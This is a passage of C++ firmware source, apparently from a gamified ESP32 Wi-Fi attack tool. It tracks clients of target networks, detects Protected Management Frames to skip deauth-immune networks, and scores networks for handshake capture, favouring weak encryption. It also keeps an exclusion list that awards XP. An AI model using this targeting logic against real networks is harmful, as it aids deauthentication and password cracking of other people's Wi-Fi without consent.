    memset(targetClients, 0, sizeof(targetClients));
    NetworkRecon::exitCritical();
}

void OinkMode::trackTargetClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    // Use BSSID match instead of targetIndex for cross-core safety
    // Early exit before lock — targetBssid is stable once set (only main loop clears it)
    if (targetBssid[0] == 0) return;
    if (memcmp(bssid, targetBssid, 6) != 0) return;

    uint32_t now = millis();

    // Spinlock protects targetClients[]/targetClientCount from concurrent access:
    // - Callback (core 1): writes here
    // - Main loop (core 0): reads in ATTACKING snapshot, writes in clearTargetClients
    NetworkRecon::enterCritical();

    // Check if client already tracked
    for (uint8_t i = 0; i < targetClientCount; i++) {
        if (memcmp(targetClients[i].mac, clientMac, 6) == 0) {
            targetClients[i].rssi = rssi;
            targetClients[i].lastSeen = now;
            NetworkRecon::exitCritical();
            return;
        }
    }

    // LRU eviction: if at capacity, evict stalest client (not seen in 30s)
    if (targetClientCount >= MAX_CLIENTS_PER_NETWORK) {
        int stalestIdx = -1;
        uint32_t oldestTime = now;
        for (uint8_t i = 0; i < targetClientCount; i++) {
            if (targetClients[i].lastSeen < oldestTime) {
                oldestTime = targetClients[i].lastSeen;
                stalestIdx = i;
            }
        }
        // Evict stale client (>30s old) to make room
        if (stalestIdx >= 0 && (now - oldestTime > 30000)) {
            targetClients[stalestIdx] = targetClients[targetClientCount - 1];
            targetClientCount--;
        } else {
            NetworkRecon::exitCritical();
            return;  // All clients fresh, give up
        }
    }

    // Add new client if room
    if (targetClientCount < MAX_CLIENTS_PER_NETWORK) {
        memcpy(targetClients[targetClientCount].mac, clientMac, 6);
        targetClients[targetClientCount].rssi = rssi;
        targetClients[targetClientCount].lastSeen = now;
        targetClientCount++;
    }

    NetworkRecon::exitCritical();
}

bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
    // Parse RSN IE to detect PMF (Protected Management Frames)
    // RSN IE starts with tag 0x30
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            // RSN capabilities are at the end, look for MFPC/MFPR bits
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // IEEE 802.11-2016 standard:
            // Bit 6: MFPC (Management Frame Protection Capable)
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    return NetworkRecon::findNetworkIndex(bssid);
}

bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
    NetworkRecon::enterCritical();
    bool result = false;
    for (const auto& hs : handshakes) {
        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
            result = true;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;
}

void OinkMode::updateTargetCache() {
    bool wasBusy = oinkBusy;
    oinkBusy = true;

    NetworkRecon::enterCritical();
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        const DetectedNetwork& net = networks()[targetIndex];
        strncpy(targetSSIDCache, net.ssid, 32);
        targetSSIDCache[32] = 0;
        targetClientCountCache = targetClientCount;
        targetHiddenCache = net.isHidden;
        memcpy(targetBssidCache, net.bssid, sizeof(targetBssidCache));
        targetCacheValid = true;
    } else {
        targetSSIDCache[0] = '\0';
        targetClientCountCache = 0;
        targetHiddenCache = false;
        memset(targetBssidCache, 0, sizeof(targetBssidCache));
        targetCacheValid = false;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
}

void OinkMode::sortNetworksByPriority() {
    // Sort networks by attack priority (in-place to avoid ~24KB heap copy):
    // 1. Has clients + no handshake + not PMF (highest priority)
    // 2. Weak auth (Open, WEP, WPA1) + no handshake
    // 3. WPA2 without PMF + no handshake
    // 4. Networks with handshake already (skip)
    // 5. PMF protected (can't attack)

    bool wasBusy = oinkBusy;
    oinkBusy = true;

    uint32_t now = millis();

    NetworkRecon::enterCritical();

    std::sort(networks().begin(), networks().end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
        auto getScore = [now](const DetectedNetwork& net) -> int {
            int score = computeTargetScore(net, now);
            if (net.hasHandshake) score -= 60;
            if (net.hasPMF) score -= 50;
            if (net.authmode == WIFI_AUTH_OPEN) score -= 40;
            if (net.ssid[0] == 0 || net.isHidden) score -= 20;
            if (net.cooldownUntil > now) score -= 20;
            if (isExcluded(net.bssid)) score -= 80;
            return score;
        };

        return getScore(a) > getScore(b);
    });

    // Revalidate target index after reordering
    if (targetIndex >= 0) {
        int foundIdx = -1;
        for (int i = 0; i < (int)networks().size(); i++) {
            if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                foundIdx = i;
                break;
            }
        }
        targetIndex = foundIdx;
        if (targetIndex < 0) {
            deauthing = false;
            channelHopping = true;
            memset(targetBssid, 0, 6);
            clearTargetClients();
        }
    }

    if (selectionIndex >= (int)networks().size()) {
        selectionIndex = networks().empty() ? 0 : (int)networks().size() - 1;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
    updateTargetCache();
}

static bool isWarmForTargets(uint32_t now) {
    if (oinkStartMs == 0) return true;
    uint32_t elapsed = now - oinkStartMs;
    if (elapsed < TARGET_WARMUP_MIN_MS) {
        return false;
    }
    if (elapsed >= TARGET_WARMUP_FORCE_MS) {
        return true;
    }
    uint32_t packets = NetworkRecon::getPacketCount() - reconPacketStart;
    if (packets >= TARGET_WARMUP_MIN_PACKETS) {
        return true;
    }
    if (NetworkRecon::getNetworkCount() >= TARGET_WARMUP_MIN_NETWORKS) {
        return true;
    }
    return false;
}

static uint8_t computeQualityScore(const DetectedNetwork& net, uint32_t now) {
    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
    uint8_t score = 0;

    if (rssi <= -95) score += 0;
    else if (rssi >= -30) score += 60;
    else score += (uint8_t)(((int)rssi + 95) * 60 / 65);

    uint32_t age = now - net.lastSeen;
    if (age <= 2000) score += 20;
    else if (age <= 5000) score += 12;
    else if (age <= 15000) score += 5;

    if (net.lastDataSeen > 0) {
        uint32_t dataAge = now - net.lastDataSeen;
        if (dataAge <= 3000) score += 20;
        else if (dataAge <= 10000) score += 10;
        else if (dataAge <= 30000) score += 5;
    }

    if (net.beaconIntervalEmaMs > 0) {
        if (net.beaconIntervalEmaMs <= 150) score += 10;
        else if (net.beaconIntervalEmaMs <= 500) score += 6;
        else if (net.beaconIntervalEmaMs <= 1000) score += 3;
    }

    if (score > 100) score = 100;
    return score;
}

static int computeTargetScore(const DetectedNetwork& net, uint32_t now) {
    int score = (int)computeQualityScore(net, now);

    // Proximity bonus: very strong nearby targets have near-100% capture probability
    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
    if (rssi >= -40) score += 25;
    else if (rssi >= -50) score += 15;

    if (net.lastDataSeen > 0) {
        uint32_t dataAge = now - net.lastDataSeen;
        if (dataAge <= CLIENT_RECENT_MS) score += 30;
        else if (dataAge <= CLIENT_RECENT_MS * 3) score += 10;
        else score -= 5;
    } else {
        score -= 5;
    }

    uint8_t estClients = NetworkRecon::estimateClientCount(net);
    if (estClients > 0) {
        uint8_t capped = estClients > 5 ? 5 : estClients;
        score += 6 + (int)capped * 2;
    }

    // Prefer weaker auth (easier crack), penalize WPA3
    switch (net.authmode) {
        case WIFI_AUTH_WEP: score += 15; break;
        case WIFI_AUTH_WPA_PSK: score += 10; break;
        case WIFI_AUTH_WPA_WPA2_PSK: score += 5; break;
        case WIFI_AUTH_WPA2_PSK: score += 0; break;
        case WIFI_AUTH_WPA2_WPA3_PSK: score -= 5; break;
        case WIFI_AUTH_WPA3_PSK: score -= 10; break;
        default: break;
    }

    score -= (int)net.attackAttempts * 8;

    // Change 7: Partial handshake retry priority
    // +50 bonus for networks with M1 captured but no M2 (we were close!)
    for (const auto& hs : OinkMode::getHandshakes()) {
        if (memcmp(hs.bssid, net.bssid, 6) == 0) {
            if (hs.hasM1() && !hs.hasM2()) score += 50;
            break;
        }
    }

    return score;
}

static inline bool isEligibleTarget(const DetectedNetwork& net, uint32_t now) {
    if (net.ssid[0] == 0 || net.isHidden) return false;
    if (net.cooldownUntil > now) return false;
    if (net.hasPMF) return false;
    if (net.hasHandshake) return false;
     if (net.authmode == WIFI_AUTH_OPEN) return false;
     if (net.attackAttempts >= TARGET_MAX_ATTEMPTS) return false;
     // 5GHz networks require C5 to be ready (connected + idle) and not already attacking
     if (net.is5GHz() && !JanusHog::isReady()) return false;
     if (net.is5GHz() && c5BackgroundActive) return false;
     int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
     if (rssi < Config::wifi().attackMinRssi) return false;
     return true;
}

int OinkMode::getNextTarget() {
    uint32_t now = millis();
    auto hasRecentClient = [now](const DetectedNetwork& net) {
        return net.lastDataSeen > 0 &&
            (now - net.lastDataSeen) <= CLIENT_RECENT_MS;
    };

    if (!isWarmForTargets(now)) {
        return -1;
    }

    int bestIdx = -1;
    int bestScore = -100000;
    int bestRecentIdx = -1;
    int bestRecentScore = -100000;

    NetworkRecon::enterCritical();
    
    // #region agent log - H3 PMF detection check
    {
        static uint32_t lastTargetLog = 0;
        if (now - lastTargetLog > 2000) {
            lastTargetLog = now;
            int pmfCount = 0, validCount = 0, totalCount = (int)networks().size();
            for (int i = 0; i < totalCount && i < 10; i++) {
                if (networks()[i].hasPMF) pmfCount++;
                if (!networks()[i].hasPMF && !networks()[i].hasHandshake && networks()[i].authmode != WIFI_AUTH_OPEN && networks()[i].ssid[0] != 0) validCount++;
            }
            Serial.printf("[DBG-H3] getNextTarget total=%d pmf=%d valid=%d\n", totalCount, pmfCount, validCount);
        }
    }
    // #endregion

    for (int i = 0; i < (int)networks().size(); i++) {
        const DetectedNetwork& net = networks()[i];
        if (isExcluded(net.bssid)) continue;  // BOAR BRO - skip
        if (!isEligibleTarget(net, now)) continue;

        int score = computeTargetScore(net, now);
        if (score > bestScore) {
            bestScore = score;
            bestIdx = i;
        }

        if (hasRecentClient(net) && net.attackAttempts < TARGET_MAX_ATTEMPTS) {
            if (score > bestRecentScore) {
                bestRecentScore = score;
                bestRecentIdx = i;
            }
        }
    }
    
    NetworkRecon::exitCritical();
    if (bestRecentIdx >= 0) {
        return bestRecentIdx;
    }
    return bestIdx;  // -1 means no suitable targets
}

// ============ BOAR BROS - Network Exclusion ============

uint64_t OinkMode::bssidToUint64(const uint8_t* bssid) {
    uint64_t result = 0;
    for (int i = 0; i < 6; i++) {
        result = (result << 8) | bssid[i];
    }
    return result;
}

bool OinkMode::isExcluded(const uint8_t* bssid) {
    uint64_t key = bssidToUint64(bssid);
    for (uint16_t i = 0; i < boarBrosCount; i++) {
        if (boarBros[i].bssid == key) return true;
    }
    return false;
}

uint16_t OinkMode::getExcludedCount() {
    return boarBrosCount;
}

uint16_t OinkMode::getFilteredCount() {
    return filteredCount;
}

bool OinkMode::loadBoarBros() {
    boarBrosCount = 0;
    memset(boarBros, 0, sizeof(boarBros));

    const char* boarPath = SDLayout::boarBrosPath();
    if (!SD.exists(boarPath)) {
        return true;
    }

    File f = SD.open(boarPath, FILE_READ);
    if (!f) {
        return false;
    }

    char lineBuf[128];
    while (f.available() && boarBrosCount < MAX_BOAR_BROS) {
        // Read line manually into stack buffer
        int pos = 0;
        while (f.available() && pos < (int)sizeof(lineBuf) - 1) {
            char c = f.read();
            if (c == '\n') break;
            if (c != '\r') lineBuf[pos++] = c;
        }
        lineBuf[pos] = '\0';

        // Trim leading spaces
        char* line = lineBuf;
        while (*line == ' ' || *line == '\t') line++;

        // Skip empty lines and comments
        if (line[0] == '\0' || line[0] == '#') continue;

        // Format: AABBCCDDEEFF  Optional SSID comment
        // Parse first 12 hex chars as BSSID
        int lineLen = strlen(line);
        if (lineLen >= 12) {
            uint64_t bssid = 0;
            bool valid = true;
            for (int i = 0; i < 12; i++) {
                char c = toupper((unsigned char)line[i]);
                uint8_t nibble;
                if (c >= '0' && c <= '9') nibble = c - '0';
                else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
                else { valid = false; break; }
                bssid = (bssid << 4) | nibble;
            }

            if (valid) {
                boarBros[boarBrosCount].bssid = bssid;
                // Extract SSID from rest of line (after space)
                if (lineLen > 13) {
                    char* ssidStart = line + 13;
                    while (*ssidStart == ' ' || *ssidStart == '\t') ssidStart++;
                    // Trim trailing spaces
                    int ssidLen = strlen(ssidStart);
                    while (ssidLen > 0 && (ssidStart[ssidLen-1] == ' ' || ssidStart[ssidLen-1] == '\t')) ssidLen--;
                    if (ssidLen > 32) ssidLen = 32;
                    memcpy(boarBros[boarBrosCount].ssid, ssidStart, ssidLen);
                    boarBros[boarBrosCount].ssid[ssidLen] = '\0';
                }
                boarBrosCount++;
            }
        }
    }

    f.close();
    return true;
}

bool OinkMode::saveBoarBros() {
    // Delete existing file first to ensure clean overwrite (FILE_WRITE appends on ESP32)
    const char* boarPath = SDLayout::boarBrosPath();
    if (SD.exists(boarPath)) {
        if (!SD.remove(boarPath)) {
            SDLog::log("OINK", "Failed to remove old BOAR BROS file");
            return false;
        }
    }

    File f = SD.open(boarPath, FILE_WRITE);
    if (!f) {
        SDLog::log("OINK", "Failed to open BOAR BROS file for writing");
        return false;
    }
    
    if (f.println("# BOAR BROS - Networks to ignore") == 0) {
        SDLog::log("OINK", "Failed to write header to BOAR BROS file");
        f.close();
        return false;
    }
    f.println("# Format: BSSID (12 hex chars) followed by optional SSID");

    for (uint16_t i = 0; i < boarBrosCount; i++) {
        uint64_t bssid = boarBros[i].bssid;

        // Convert uint64 back to hex string
        char hex[13];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
                 (uint8_t)((bssid >> 40) & 0xFF),
                 (uint8_t)((bssid >> 32) & 0xFF),
                 (uint8_t)((bssid >> 24) & 0xFF),
                 (uint8_t)((bssid >> 16) & 0xFF),
                 (uint8_t)((bssid >> 8) & 0xFF),
                 (uint8_t)(bssid & 0xFF));

        if (boarBros[i].ssid[0] != '\0') {
            f.printf("%s %s\n", hex, boarBros[i].ssid);
        } else {
            f.println(hex);
        }
    }
    
    f.close();
    return true;
}

void OinkMode::removeBoarBro(uint64_t bssid) {
    for (uint16_t i = 0; i < boarBrosCount; i++) {
        if (boarBros[i].bssid == bssid) {
            // Shift remaining entries down
            if (i < boarBrosCount - 1) {
                memmove(&boarBros[i], &boarBros[i + 1], (boarBrosCount - i - 1) * sizeof(BoarBro));
            }
            boarBrosCount--;
            memset(&boarBros[boarBrosCount], 0, sizeof(BoarBro));
            break;
        }
    }
    saveBoarBros();
}

// Inject fake network for stress testing (no RF)
void OinkMode::injectTestNetwork(const uint8_t* bssid, const char* ssid, uint8_t channel, int8_t rssi, wifi_auth_mode_t authmode, bool hasPMF) {
    if (!running) return;
    
    NetworkRecon::enterCritical();

    if (networks().size() >= 100) {
        NetworkRecon::exitCritical();
        return;  // Cap
    }
    if (!HeapGates::canGrow(HeapPolicy::kMinHeapForOinkNetworkAdd,
                            HeapPolicy::kMinFragRatioForGrowth)) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // Check if already exists
    for (auto& net : networks()) {
        if (memcmp(net.bssid, bssid, 6) == 0) {
            // Update existing
            net.rssi = rssi;
            net.lastSeen = millis();
            net.beaconCount++;
            NetworkRecon::exitCritical();
            return;
        }
    }
    
    // Add new
    DetectedNetwork net = {0};
    memcpy(net.bssid, bssid, 6);
    if (ssid && ssid[0]) {
        strncpy(net.ssid, ssid, 32);
        net.ssid[32] = 0;
    }
    net.channel = channel;
    net.rssi = rssi;
    net.authmode = authmode;
    net.hasPMF = hasPMF;
    net.lastSeen = millis();
    net.beaconCount = 1;
    net.isTarget = false;
    net.hasHandshake = false;
    net.attackAttempts = 0;
    net.isHidden = (!ssid || ssid[0] == 0);
    net.lastDataSeen = 0;
    net.cooldownUntil = 0;
    
    try {
        networks().push_back(net);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to inject test network: out of memory");
        return;
    }
    NetworkRecon::exitCritical();
}

bool OinkMode::excludeNetwork(int index) {
    if (index < 0 || index >= (int)networks().size()) {
        return false;
    }
    if (boarBrosCount >= MAX_BOAR_BROS) {
        return false;
    }

    uint64_t bssid = bssidToUint64(networks()[index].bssid);

    // Check if already excluded
    if (isExcluded(networks()[index].bssid)) {
        return false;
    }

    // Store BSSID with SSID (use NONAME BRO for hidden networks)
    boarBros[boarBrosCount].bssid = bssid;
    const char* ssid = networks()[index].ssid;
    if (ssid[0] == '\0') ssid = "NONAME BRO";
    strncpy(boarBros[boarBrosCount].ssid, ssid, 32);
    boarBros[boarBrosCount].ssid[32] = '\0';
    boarBrosCount++;
    saveBoarBros();
    
    // Check if this is a mid-attack exclusion (mercy save) vs normal exclusion
    bool isMidAttack = (targetIndex == index && deauthing);
    
    // If this was the current attack target, abort the attack immediately
    if (targetIndex == index) {
        deauthing = false;
        channelHopping = true;
        targetIndex = -1;
        memset(targetBssid, 0, 6);
        clearTargetClients();
        autoState = AutoState::NEXT_TARGET;
        stateStartTime = millis();
    }
    
    // Award XP for BOAR BROS action
    if (isMidAttack) {
        XP::addXP(XPEvent::BOAR_BRO_MERCY);  // +15 XP - mid-attack mercy!
    } else {
        XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP - normal exclusion
    }
    
    return true;
}

// Exclude network by BSSID directly (for use from other modes like SPECTRUM)
bool OinkMode::excludeNetworkByBSSID(const uint8_t* bssid, const char* ssidIn) {
    if (boarBrosCount >= MAX_BOAR_BROS) {
        return false;
    }

    uint64_t bssid64 = bssidToUint64(bssid);

    // Check if already excluded
    if (isExcluded(bssid)) {
        return false;
    }

    // Store BSSID with SSID (use NONAME BRO for hidden/empty networks)
    boarBros[boarBrosCount].bssid = bssid64;
    const char* ssid = (ssidIn && ssidIn[0]) ? ssidIn : "NONAME BRO";
    strncpy(boarBros[boarBrosCount].ssid, ssid, 32);
    boarBros[boarBrosCount].ssid[32] = '\0';
    boarBrosCount++;
    saveBoarBros();
    
    // Award XP for BOAR BROS action
    XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP
    
    return true;
}
